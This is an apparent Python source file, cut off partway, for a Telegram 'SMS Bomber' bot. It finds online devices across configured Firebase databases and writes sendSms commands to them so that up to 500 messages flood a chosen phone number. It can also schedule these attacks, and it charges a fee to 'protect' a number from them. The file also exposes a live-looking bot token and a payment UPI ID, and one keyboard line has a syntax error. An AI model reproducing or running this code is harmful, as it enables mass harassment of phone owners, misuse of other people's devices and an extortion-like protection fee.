"""
✨ ꜱᴍꜱ ʙᴏᴍʙᴇʀ ᴠ5.3 — ᴄʏʙᴇʀ ᴇᴅɪᴛɪᴏɴ ✨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• ᴀᴜᴛᴏ-ᴅɪꜱᴄᴏᴠᴇʀ ᴀʟʟ ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇꜱ ꜰʀᴏᴍ ᴀʟʟ ꜰɪʀᴇʙᴀꜱᴇꜱ
• ᴘᴀʀᴀʟʟᴇʟ ꜱᴇɴᴅ ᴀᴄʀᴏꜱꜱ ᴀʟʟ ᴅᴇᴠɪᴄᴇꜱ ꜱɪᴍᴜʟᴛᴀɴᴇᴏᴜꜱʟʏ
• ꜱᴄʜᴇᴅᴜʟᴇ ʙᴏᴍʙɪɴɢ (ᴍɪɴᴜᴛᴇꜱ, ʜᴏᴜʀꜱ, ᴅᴀʏꜱ) - ᴀᴜᴛᴏ ᴇxᴇᴄᴜᴛɪᴏɴ
• ᴇxᴀᴄᴛ ꜱᴍꜱ ᴄᴏᴜɴᴛ ᴅᴇʟɪᴠᴇʀʏ (Max 500)
• ꜰɪʀᴇʙᴀꜱᴇ ʜɪᴅᴅᴇɴ ꜰʀᴏᴍ ᴜꜱᴇʀꜱ
• 🌌 ꜱᴍᴀʟʟ ᴄᴀᴘꜱ ᴜɪ, ᴀɴɪᴍᴀᴛɪᴏɴꜱ & ꜰᴏʀᴄᴇ ᴊᴏɪɴ
• 🛡️ ɴᴜᴍʙᴇʀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ꜱʏꜱᴛᴇᴍ
• 💾 ᴅᴀᴛᴀʙᴀꜱᴇ ʙᴀᴄᴋᴜᴘ & ʀᴇꜱᴛᴏʀᴇ
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
import asyncio, json, os, re, time, logging, random
from datetime import datetime, timedelta
from typing import Dict, List, Optional
import aiohttp
from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import FSInputFile

# ════════════════════════════════════════════════════════════
# LOGGING
# ════════════════════════════════════════════════════════════
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s — %(message)s")
log = logging.getLogger("SMSBomber")

# ════════════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════════════
BOT_TOKEN = "8907592337:AAG6un4i8amIlzVaIQrgNCMaLz9aPGfUYhY"
OWNER_ID = 8679787798  # Change to your ID
DATA_FILE = "bomber_data.json"
VERSION = "v5.3"
MAX_CONCURRENT = 500
MAX_COUNT = 500 # Updated Limit

# Hardcoded Force Join Channels (Admin cannot change these via panel)
FORCE_JOIN_CHANNELS = ["@tchbsterarmy", "@elsewayshortcut"] 

# Payment Details for Protection
PROTECTION_PRICE = "30 Rs"
PAYMENT_UPI = "8707210511@fam"

# ════════════════════════════════════════════════════════════
# UI & ANIMATION HELPERS
# ════════════════════════════════════════════════════════════
SC_MAP = {
    'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ꜰ', 'g': 'ɢ',
    'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ',
    'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ', 'u': 'ᴜ',
    'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ'
}

def sc(text: str) -> str:
    """Converts text to small caps while preserving HTML tags and numbers"""
    if not isinstance(text, str): return str(text)
    parts = re.split(r'(<[^>]+>)', text)
    for i in range(0, len(parts), 2):
        parts[i] = "".join(SC_MAP.get(c.lower(), c) for c in parts[i])
    return "".join(parts)

def styled_box(title: str, body: str) -> str:
    return (
        f"╭─── ✧ ─────────────── ✧ ───╮\n"
        f"┃ ✨ {sc(title).upper()}\n"
        f"┣─── ✧ ─────────────── ✧ ───┤\n"
        f"{body}\n"
        f"╰─── ✧ ─────────────── ✧ ───╯"
    )

async def animate_edit(msg: types.Message, text: str, duration: int = 2):
    """Creates a loading spinner animation"""
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    for i in range(duration * 5):
        try:
            await msg.edit_text(f"<code>{frames[i % 10]}</code> {text}", parse_mode="HTML")
        except: pass
        await asyncio.sleep(0.2)

# ════════════════════════════════════════════════════════════
# FORCE JOIN HELPERS
# ════════════════════════════════════════════════════════════
async def check_fj(bot: Bot, user_id: int, channels: list) -> bool:
    if not channels: return True
    for ch in channels:
        try:
            m = await bot.get_chat_member(ch, user_id)
            if m.status in ["left", "kicked", None]: return False
        except: return False
    return True

async def send_fj_ui(event, channels: list):
    text = sc("✨ ᴍᴀɴᴅᴀᴛᴏʀʏ ꜱᴜʙꜱᴄʀɪᴘᴛɪᴏɴ ✨\n\n")
    text += sc("ʏᴏᴜ ᴍᴜꜱᴛ ᴊᴏɪɴ ᴛʜᴇꜱᴇ ᴄʜᴀɴɴᴇʟꜱ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ:\n\n")
    kb = []
    for i, ch in enumerate(channels):
        text += f"🔗 <code>{ch}</code>\n"
        url = f"https://t.me/{ch.replace('@', '')}"
        kb.append([types.InlineKeyboardButton(text=sc(f"📢 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ {i+1}"), url=url)])
    kb.append([types.InlineKeyboardButton(text=sc("🔄 ᴠᴇʀɪꜰʏ ᴍᴇᴍʙᴇʀꜱʜɪᴘ"), callback_data="fj_verify")])
    markup = types.InlineKeyboardMarkup(inline_keyboard=kb)
    if isinstance(event, types.Message):
        await event.answer(text, reply_markup=markup, parse_mode="HTML")
    else:
        await event.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

# ════════════════════════════════════════════════════════════
# FSM STATES
# ════════════════════════════════════════════════════════════
class Form(StatesGroup):
    fb_add_url = State()
    fb_add_api = State()
    bomb_number = State()
    bomb_message = State()
    bomb_count = State()
    schedule_number = State()
    schedule_message = State()
    schedule_count = State()
    schedule_time = State()
    schedule_name = State()
    protect_txn = State()       # New: For protection transaction ID
    protect_number = State()    # New: For protection phone number

# ════════════════════════════════════════════════════════════
# STORAGE
# ════════════════════════════════════════════════════════════
def default_data():
    return {
        "admins": [OWNER_ID],
        "firebases": [],
        "banned": [],
        "schedules": [],
        "protected_numbers": [],  # New: List of protected numbers
        "protection_requests": [], # New: Pending requests
        "stats": {"total_sent": 0, "total_failed": 0, "total_bombings": 0}
    }

def load():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            d = json.load(f)
        for k, v in default_data().items():
            if k not in d: d[k] = v
        return d
    return default_data()

def save(d):
    with open(DATA_FILE, "w") as f:
        json.dump(d, f, indent=2)

def is_admin(uid, d): return uid in d.get("admins", []) or uid == OWNER_ID
def is_banned(uid, d): return uid in d.get("banned", [])

# ════════════════════════════════════════════════════════════
# KEYBOARD HELPERS
# ════════════════════════════════════════════════════════════
def kb(rows):
    keyboard = []
    for row in rows:
        btn_row = []
        for item in row:
            if isinstance(item, tuple) and len(item) >= 2:
                btn_row.append(types.InlineKeyboardButton(text=item[0], callback_data=item[1]))
            elif isinstance(item, dict):
                btn_row.append(types.InlineKeyboardButton(text=item["text"], callback_data=item["callback"]))
        if btn_row: keyboard.append(btn_row)
    return types.InlineKeyboardMarkup(inline_keyboard=keyboard)

# ════════════════════════════════════════════════════════════
# FIREBASE HELPERS (Unchanged Logic)
# ════════════════════════════════════════════════════════════
async def fb_get(base: str, path: str, api_key: str = "") -> dict:
    url = base.rstrip("/") + path
    if api_key: url += f"?auth={api_key}"
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=15) as r:
                if r.status == 200:
                    txt = await r.text()
                    return {} if txt == "null" or txt == "" else json.loads(txt)
    except Exception as e: log.error(f"fb_get error: {e}")
    return {}

async def fb_put(base: str, path: str, payload: dict, api_key: str = "") -> bool:
    url = base.rstrip("/") + path
    if api_key: url += f"?auth={api_key}"
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=15) as r:
                    if 200 <= r.status < 300: return True
        except Exception as e: log.warning(f"fb_put error: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

# ════════════════════════════════════════════════════════════
# CORE BOMBING ENGINE (Unchanged Logic)
# ════════════════════════════════════════════════════════════
def is_device_online(device_data: dict) -> bool:
    for flag in ["isOnline", "online", "connected", "status"]:
        if flag in device_data and device_data[flag] in (True, 1, "online", "active", "true"): return True
    return False

async def discover_online_devices(fb: dict) -> List[dict]:
    data = await fb_get(fb["url"], "/clients.json", fb.get("api_key", ""))
    if not data or not isinstance(data, dict): return []
    devices = []
    for device_id, device_data in data.items():
        if not is_device_online(device_data): continue
        sims = device_data.get("sims", [])
        if not sims: sims = [{"simSlotIndex": 0, "phoneNumber": device_data.get("phoneNumber", "")}]
        for sim in sims:
            devices.append({
                "fb_id": fb["id"], "fb_url": fb["url"], "api_key": fb.get("api_key", ""),
                "device_id": device_id, "device_name": device_data.get("deviceName", device_id),
                "sim_slot": sim.get("simSlotIndex", 0), "phone_number": sim.get("phoneNumber", ""),
                "battery": device_data.get("battery", 0)
            })
    return devices

async def discover_all_devices(firebases: List[dict]) -> List[dict]:
    tasks = [discover_online_devices(fb) for fb in firebases]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    all_devices = []
    for res in results:
        if isinstance(res, list): all_devices.extend(res)
    return all_devices

async def send_single_sms(device: dict, to: str, message: str) -> tuple:
    payload = {"from": device["sim_slot"], "to": to.strip(), "message": message.strip(), "isSended": False, "timestamp": int(time.time()), "deviceId": device["device_id"], "simSlot": device["sim_slot"]}
    path = f"/clients/{device['device_id']}/webhookEvent/sendSms.json"
    success = await fb_put(device["fb_url"], path, payload, device.get("api_key", ""))
    return success, device["device_name"], device["device_id"]

_bombing_tasks = {}
_bombing_status = {}

async def bomber_worker(bot, user_id: int, number: str, message: str, count: int, schedule_id: str = None):
    d = load()
    firebases = d.get("firebases", [])
    if not firebases:
        await bot.send_message(user_id, sc("ғɪʀᴇʙᴀsᴇ ᴅᴇᴠɪᴄᴇ ᴀᴅᴅ ɴʜɪ ʜᴀɪ, ʙᴀᴀᴅ ᴍᴇ ᴋᴀʀᴇ 🚫"))
        return
    
    status_msg = await bot.send_message(user_id, sc("🔍 ᴅɪꜱᴄᴏᴠᴇʀɪɴɢ ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇꜱ..."), parse_mode="HTML")
    await animate_edit(status_msg, sc("ꜱᴄᴀɴɴɪɴɢ ɴᴏᴅᴇꜱ..."), 2)
    
    all_devices = await discover_all_devices(firebases)
    if not all_devices:
        await status_msg.edit_text(sc("ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇ ɴʜɪ ᴍɪʟᴀ!"), parse_mode="HTML")
        return

    await status_msg.edit_text(
        styled_box("ᴘʀᴇᴘᴀʀɪɴɢ ʙᴏᴍʙɪɴɢ", 
        f"📱 {sc('ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇꜱ')}: <b>{len(all_devices)}</b>\n"
        f"🎯 {sc('ᴛᴀʀɢᴇᴛ ᴄᴏᴜɴᴛ')}: <b>{count}</b>\n"
        f"📞 {sc('ᴛᴀʀɢᴇᴛ')}: <code>{number}</code>\n\n"
        f"<i>{sc('ɪɴɪᴛɪᴀᴛɪɴɢ ꜱᴇǫᴜᴇɴᴄᴇ...')}</i>"), parse_mode="HTML")

    sent, failed, start_time = 0, 0, time.time()
    _bombing_status[user_id] = {"total": count, "sent": 0, "failed": 0, "devices": len(all_devices), "start": start_time, "running": True, "number": number}
    
    total_devices = len(all_devices)
    device_index = 0
    
    for i in range(count):
        device = all_devices[device_index % total_devices]
        device_index += 1
        success, _, _ = await send_single_sms(device, number, message)
        if success: sent += 1
        else: failed += 1
        
        _bombing_status[user_id]["sent"] = sent
        _bombing_status[user_id]["failed"] = failed
        
        progress = int((sent + failed) / count * 100)
        if progress % 10 == 0 or sent + failed >= count:
            try:
                bar_len = 15
                filled = int(bar_len * (sent + failed) / count)
                bar = "▰" * filled + "▱" * (bar_len - filled)
                await status_msg.edit_text(
                    styled_box("ʙᴏᴍʙɪɴɢ ɪɴ ᴘʀᴏɢʀᴇꜱꜱ",
                    f"📞 <code>{number}</code>\n"
                    f"✅ {sc('ꜱᴇɴᴛ')}: <b>{sent}</b> | ❌ {sc('ꜰᴀɪʟᴇᴅ')}: <b>{failed}</b>\n"
                    f"📊 <code>{bar}</code> {progress}%\n"
                    f"⏱ {sc('ᴛɪᴍᴇ')}: {int(time.time() - start_time)}s\n\n"
                    f"<i>{sc('ᴜꜱᴇ /stop ᴛᴏ ᴄᴀɴᴄᴇʟ')}</i>"), parse_mode="HTML")
            except: pass
            
        if user_id in _bombing_tasks and _bombing_tasks[user_id].cancelled(): break
        await asyncio.sleep(0.05)

    _bombing_status[user_id]["running"] = False
    d = load()
    d["stats"]["total_sent"] += sent
    d["stats"]["total_failed"] += failed
    d["stats"]["total_bombings"] += 1
    save(d)

    final_msg = styled_box("ᴍɪꜱꜱɪᴏɴ ᴄᴏᴍᴘʟᴇᴛᴇ",
        f"📞 <code>{number}</code>\n"
        f"✅ {sc('ꜱᴇɴᴛ')}: <b>{sent}</b>\n"
        f"❌ {sc('ꜰᴀɪʟᴇᴅ')}: <b>{failed}</b>\n"
        f"⏱ {sc('ᴛɪᴍᴇ')}: {int(time.time() - start_time)}s\n"
        f"📈 {sc('ꜱᴜᴄᴄᴇꜱꜱ ʀᴀᴛᴇ')}: <b>{round(sent/(sent+failed)*100, 1) if sent+failed>0 else 0}%</b>")
    
    try: await bot.send_message(user_id, final_msg, parse_mode="HTML")
    except: await bot.send_message(user_id, f"✅ Sent: {sent}, Failed: {failed}")
    
    if user_id in _bombing_tasks: del _bombing_tasks[user_id]

async def start_bombing(bot, user_id: int, number: str, message: str, count: int, schedule_id: str = None):
    if user_id in _bombing_tasks: _bombing_tasks[user_id].cancel(); await asyncio.sleep(0.5)
    task = asyncio.create_task(bomber_worker(bot, user_id, number, message, count, schedule_id))
    _bombing_tasks[user_id] = task
    return task

def stop_bombing(user_id: int) -> bool:
    if user_id in _bombing_tasks: _bombing_tasks[user_id].cancel(); del _bombing_tasks[user_id]; return True
    return False

# ════════════════════════════════════════════════════════════
# SCHEDULER ENGINE (Unchanged Logic)
# ════════════════════════════════════════════════════════════
_scheduler_running = False
_scheduler_task = None

def parse_time_string(time_str: str) -> int:
    time_str = time_str.strip().lower()
    pattern = r'(\d+)([dhm])'
    matches = re.findall(pattern, time_str)
    if matches:
        total = 0
        for value, unit in matches:
            if unit == 'd': total += int(value) * 86400
            elif unit == 'h': total += int(value) * 3600
            elif unit == 'm': total += int(value) * 60
        return total
    if time_str.endswith('m'): return int(time_str[:-1]) * 60
    elif time_str.endswith('h'): return int(time_str[:-1]) * 3600
    elif time_str.endswith('d'): return int(time_str[:-1]) * 86400
    else:
        try: return int(time_str) * 60
        except: return 0

def format_time_remaining(seconds: int) -> str:
    if seconds < 60: return f"{seconds}s"
    elif seconds < 3600: return f"{seconds // 60}m {seconds % 60}s"
    elif seconds < 86400: return f"{seconds // 3600}h {(seconds % 3600) // 60}m"
    else: return f"{seconds // 86400}d {(seconds % 86400) // 3600}h"

async def schedule_worker(bot):
    global _scheduler_running
    while _scheduler_running:
        try:
            d = load()
            for sched in d.get("schedules", []):
                if sched.get("status") != "pending": continue
                try:
                    if datetime.now() >= datetime.fromisoformat(sched["time"]):
                        await start_bombing(bot, OWNER_ID, sched["number"], sched["message"], sched["count"], sched["id"])
                except: continue
            await asyncio.sleep(10)
        except Exception as e:
            log.error(f"Scheduler error: {e}")
            await asyncio.sleep(30)

async def start_scheduler(bot):
    global _scheduler_running, _scheduler_task
    if _scheduler_running: return
    _scheduler_running = True
    _scheduler_task = asyncio.create_task(schedule_worker(bot))

async def stop_scheduler():
    global _scheduler_running, _scheduler_task
    _scheduler_running = False
    if _scheduler_task: _scheduler_task.cancel()

# ════════════════════════════════════════════════════════════
# KEYBOARDS (Upgraded UI)
# ════════════════════════════════════════════════════════════
def main_menu(uid, d):
    rows = []
    if is_admin(uid, d): rows.append([(sc("🛡 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ"), "admin:panel")])
    rows.append([(sc("💣 ꜱᴛᴀʀᴛ ʙᴏᴍʙɪɴɢ"), "bomb:start")])
    rows.append([(sc("🛡️ ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ"), "protect:start")]) # New Button
    rows.append([(sc("📊 ᴍʏ ꜱᴛᴀᴛꜱ"), "stats:show"), "status:show")])
    rows.append([(sc("❓ ʜᴇʟᴘ"), "help:show")])
    return kb(rows)

def admin_panel_kb(d):
    pending_reqs = len(d.get("protection_requests", []))
    return kb([
        [(sc("🔥 ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ"), "admin:fb_add"), (sc("📋 ʟɪꜱᴛ ɴᴏᴅᴇꜱ"), "admin:fb_list")],
        [(sc("📅 ꜱᴄʜᴇᴅᴜʟᴇ ʙᴏᴍʙ"), "admin:schedule"), (sc("📋 ᴍᴀɴᴀɢᴇ ꜱᴄʜᴇᴅᴜʟᴇꜱ"), "admin:schedule_list")],
        [(sc(f"🛡️ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ({pending_reqs})"), "admin:protection")], # New Section
        [(sc("📡 ʟɪᴠᴇ ꜱᴛᴀᴛᴜꜱ"), "admin:status"), (sc("📊 ɢʟᴏʙᴀʟ ꜱᴛᴀᴛꜱ"), "admin:stats")],
        [(sc("👥 ᴀᴅᴍɪɴꜱ"), "admin:admins")],
        [(sc("🚫 ʙᴀɴ ᴜꜱᴇʀ"), "admin:ban"), (sc("✅ ᴜɴʙᴀɴ ᴜꜱᴇʀ"), "admin:unban")],
        [(sc("💾 ʙᴀᴄᴋᴜᴘ/ʀᴇꜱᴛᴏʀᴇ"), "admin:db_tools")], # New Section
        [(sc("🔙 ʙᴀᴄᴋ"), "home")]
    ])

def back_button(callback: str = "home"):
    return kb([[("◀️ " + sc("ʙᴀᴄᴋ"), callback)]])

# ════════════════════════════════════════════════════════════
# ROUTER
# ════════════════════════════════════════════════════════════
R = Router()

# ── Start ──────────────────────────────────────────────────
@R.message(Command("start"))
async def cmd_start(msg: types.Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    d = load()
    
    # Force Join Check (Using Hardcoded List)
    if not await check_fj(msg.bot, uid, FORCE_JOIN_CHANNELS):
        await send_fj_ui(msg, FORCE_JOIN_CHANNELS)
        return
        
    if is_banned(uid, d):
        await msg.answer(sc("🚫 ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ!"))
        return

    fb_count = len(d.get("firebases", []))
    text = styled_box("ꜱᴍꜱ ʙᴏᴍʙᴇʀ ɢᴀᴛᴇᴡᴀʏ",
        f"💣 {sc('ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ ꜱᴍꜱ ʙᴏᴍʙᴇʀ')}\n"
        f"📱 {sc('ᴀᴜᴛᴏ-ᴅɪꜱᴄᴏᴠᴇʀꜱ ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇꜱ')}\n"
        f"🚀 {sc('ᴘᴀʀᴀʟʟᴇʟ ꜱᴇɴᴅɪɴɢ ꜰᴏʀ ᴍᴀx ꜱᴘᴇᴇᴅ')}\n\n"
        f"📡 {sc('ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴅᴇꜱ')}: <b>{fb_count}</b>\n"
        f"📅 {sc('ꜱᴄʜᴇᴅᴜʟᴇꜱ')}: <b>{len(d.get('schedules', []))}</b>\n\n"
        f"<i>{sc('ᴜꜱᴇ /stop ᴛᴏ ᴄᴀɴᴄᴇʟ ʙᴏᴍʙɪɴɢ ᴀɴʏᴛɪᴍᴇ')}</i>")
    await msg.answer(text, reply_markup=main_menu(uid, d), parse_mode="HTML")

# ── Stop ──────────────────────────────────────────────────
@R.message(Command("stop"))
async def cmd_stop(msg: types.Message):
    if stop_bombing(msg.from_user.id):
        await msg.answer(sc("⏹ ʙᴏᴍʙɪɴɢ ꜱᴛᴏᴘᴘᴇᴅ!"), parse_mode="HTML")
    else:
        await msg.answer(sc("ℹ️ ɴᴏ ᴀᴄᴛɪᴠᴇ ʙᴏᴍʙɪɴɢ ᴛᴏ ꜱᴛᴏᴘ."))

# ── Force Join Verify ─────────────────────────────────────
@R.callback_query(F.data == "fj_verify")
async def cb_fj_verify(cq: types.CallbackQuery):
    if await check_fj(cq.bot, cq.from_user.id, FORCE_JOIN_CHANNELS):
        await cq.answer(sc("✅ ᴠᴇʀɪꜰɪᴇᴅ! ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ."), show_alert=True)
        await cb_home(cq, await cq.bot.get_state(cq.from_user.id))
    else:
        await cq.answer(sc("❌ ʏᴏᴜ ʜᴀᴠᴇɴ'ᴛ ᴊᴏɪɴᴇᴅ ʏᴇᴛ!"), show_alert=True)

# ── Help ──────────────────────────────────────────────────
@R.callback_query(F.data == "help:show")
async def cb_help(cq: types.CallbackQuery):
    await cq.answer()
    text = styled_box("ᴄᴏᴍᴍᴀɴᴅ ᴄᴇɴᴛʀᴀʟ",
        f"1️⃣ {sc('ᴛᴀᴘ 💣 ꜱᴛᴀʀᴛ ʙᴏᴍʙɪɴɢ')}\n"
        f"2️⃣ {sc('ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴅᴀʟᴇ (ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ ᴋᴇ sᴀᴛʜ)')}\n"
        f"3️⃣ {sc('ᴍᴇssᴀɢᴇ ᴅᴀʟᴇ ᴊᴏ ʙʜᴇᴊɴᴀ ʜᴀɪ')}\n"
        f"4️⃣ {sc('ᴋɪᴛɴᴀ ʙʜᴇᴊɴᴀ ʜᴀɪ? (ᴍᴀx 1000 ꜱᴍꜱ)')}\n\n"
        f"⚡ {sc('ꜰᴇᴀᴛᴜʀᴇꜱ')}\n"
        f"• {sc('ᴀᴜᴛᴏ-ᴅɪꜱᴄᴏᴠᴇʀꜱ ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇꜱ')}\n"
        f"• {sc('ᴘᴀʀᴀʟʟᴇʟ ꜱᴇɴᴅɪɴɢ (ᴜᴘ ᴛᴏ 500 ᴀᴛ ᴏɴᴄᴇ)')}\n"
        f"• {sc('ʀᴇᴀʟ-ᴛɪᴍᴇ ᴘʀᴏɢʀᴇꜱꜱ  & ᴀɴɪᴍᴀᴛɪᴏɴꜱ')}\n"
        f"• {sc('ɴᴜᴍʙᴇʀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ꜱʏꜱᴛᴇᴍ')}")
    await cq.message.edit_text(text, reply_markup=back_button(), parse_mode="HTML")

# ── Home ──────────────────────────────────────────────────
@R.callback_query(F.data == "home")
async def cb_home(cq: types.CallbackQuery, state: FSMContext = None):
    if state: await state.clear()
    uid = cq.from_user.id
    d = load()
    
    # Force Join Check
    if not await check_fj(cq.bot, uid, FORCE_JOIN_CHANNELS):
        await send_fj_ui(cq, FORCE_JOIN_CHANNELS)
        return

    fb_count = len(d.get("firebases", []))
    text = styled_box("ꜱᴍꜱ ʙᴏᴍʙᴇʀ ɢᴀᴛᴇᴡᴀʏ",
        f"💣 {sc('ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ ꜱᴍꜱ ʙᴏᴍʙᴇʀ')}\n"
        f"📡 {sc('ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴅᴇꜱ')}: <b>{fb_count}</b>\n"
        f"📅 {sc('ꜱᴄʜᴇᴅᴜʟᴇꜱ')}: <b>{len(d.get('schedules', []))}</b>\n\n"
        f"<i>{sc('ᴜꜱᴇ /stop ᴛᴏ ᴄᴀɴᴄᴇʟ ʙᴏᴍʙɪɴɢ ᴀɴʏᴛɪᴍᴇ')}</i>")
    await cq.message.edit_text(text, reply_markup=main_menu(uid, d), parse_mode="HTML")

# ── Live Status ────────────────────────────────────────────
@R.callback_query(F.data == "status:show")
async def cb_status(cq: types.CallbackQuery):
    d = load()
    firebases = d.get("firebases", [])
    if not firebases:
        await cq.answer(sc("❌ ɴᴏ ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴅᴇꜱ ᴄᴏɴꜰɪɢᴜʀᴇᴅ!"), show_alert=True)
        return
    
    await cq.answer(sc("🔍 ꜱᴄᴀɴɴɪɴɢ ɴᴏᴅᴇꜱ..."))
    await animate_edit(cq.message, sc("ꜱʏɴᴄɪɴɢ ᴡɪᴛʜ ꜰɪʀᴇʙᴀꜱᴇ..."), 2)
    
    all_devices = await discover_all_devices(firebases)
    text = styled_box("ʟɪᴠᴇ ᴛᴇʟᴇᴍᴇᴛʀʏ", f"📱 {sc('ᴛᴏᴛᴀʟ ᴅᴇᴠɪᴄᴇꜱ')}: <b>{len(all_devices)}</b>\n\n")
    
    for i, fb in enumerate(firebases):
        fb_devices = [d for d in all_devices if d["fb_id"] == fb["id"]]
        text += f"🔥 {sc('ɴᴏᴅᴇ')} #{i+1}: 🟢 <b>{len(fb_devices)}</b> {sc('ᴏɴʟɪɴᴇ')}\n"
    
    text += f"\n🕐 {sc('ʟᴀꜱᴛ ꜱʏɴᴄ')}: {datetime.now().strftime('%H:%M:%S')}"
    await cq.message.edit_text(text, reply_markup=back_button(), parse_mode="HTML")

# ── Stats ──────────────────────────────────────────────────
@R.callback_query(F.data == "stats:show")
async def cb_stats(cq: types.CallbackQuery):
    uid = cq.from_user.id
    status = _bombing_status.get(uid, {})
    if status and status.get("running"):
        elapsed = int(time.time() - status.get("start", time.time()))
        text = styled_box("ᴀᴄᴛɪᴠᴇ ᴛᴇʟᴇᴍᴇᴛʀʏ",
            f"📞 <code>{status.get('number', '?')}</code>\n"
            f"✅ {sc('ꜱᴇɴᴛ')}: <b>{status.get('sent', 0)}</b>\n"
            f"❌ {sc('ꜰᴀɪʟᴇᴅ')}: <b>{status.get('failed', 0)}</b>\n"
            f"📱 {sc('ᴅᴇᴠɪᴄᴇꜱ')}: <b>{status.get('devices', 0)}</b>\n"
            f"⏱ {sc('ʀᴜɴɴɪɴɢ')}: {elapsed}s")
    else:
        d = load()
        gs = d.get("stats", {"total_sent": 0, "total_failed": 0, "total_bombings": 0})
        text = styled_box("ɢʟᴏʙᴀʟ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ",
            f"🔥 {sc('ɴᴏᴅᴇꜱ')}: <b>{len(d.get('firebases', []))}</b>\n"
            f"✅ {sc('ᴛᴏᴛᴀʟ ꜱᴇɴᴛ')}: <b>{gs.get('total_sent', 0)}</b>\n"
            f"❌ {sc('ᴛᴏᴛᴀʟ ꜰᴀɪʟᴇᴅ')}: <b>{gs.get('total_failed', 0)}</b>\n"
            f"💣 {sc('ʙᴏᴍʙɪɴɢꜱ ʀᴜɴ')}: <b>{gs.get('total_bombings', 0)}</b>")
    await cq.message.edit_text(text, reply_markup=back_button(), parse_mode="HTML")

# ── Bombing Flow ──────────────────────────────────────────
@R.callback_query(F.data == "bomb:start")
async def cb_bomb_start(cq: types.CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    
    # Force Join Check
    if not await check_fj(cq.bot, uid, FORCE_JOIN_CHANNELS):
        await send_fj_ui(cq, FORCE_JOIN_CHANNELS)
        return

    if not d.get("firebases"):
        await cq.answer(sc("❌ ғɪʀᴇʙᴀsᴇ ᴅᴇᴠɪᴄᴇ ᴀᴅᴅ ɴʜɪ ʜᴀɪ! ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ."), show_alert=True)
        return

    await state.set_state(Form.bomb_number)
    await cq.message.edit_text(
        styled_box("ᴛᴀʀɢᴇᴛ ᴀᴄǫᴜɪꜱɪᴛɪᴏɴ", f"📞 {sc('ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴅᴀʟᴇ :')}\n\n{sc('ꜰᴏʀᴍᴀᴛ')}: <code>+919876543210</code>\n{sc('ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ ᴋᴇ sᴀᴛʜ')}\n\n<i>{sc('ꜱᴇɴᴅ /cancel ᴛᴏ ᴀʙᴏʀᴛ')}</i>"),
        reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "home")]]), parse_mode="HTML")

@R.message(Form.bomb_number)
async def process_number(msg: types.Message, state: FSMContext):
    if not msg.text:
        await msg.answer(sc("❌ sᴀʜɪ ɴᴜᴍʙᴇʀ ᴅᴀʟᴇ"))
        return
    # FIX: Removed spaces/dashes and fixed regex escape
    number = msg.text.strip().replace(" ", "").replace("-", "")
    if not re.match(r'^\+?[0-9]{8,15}$', number):
        await msg.answer(sc("❌ ɢᴀʟᴀᴛ ɴᴜᴍʙᴇʀ! ᴜꜱᴇ: +919876543210"))
        return
    
    # CHECK PROTECTION
    d = load()
    protected = d.get("protected_numbers", [])
    if number in protected:
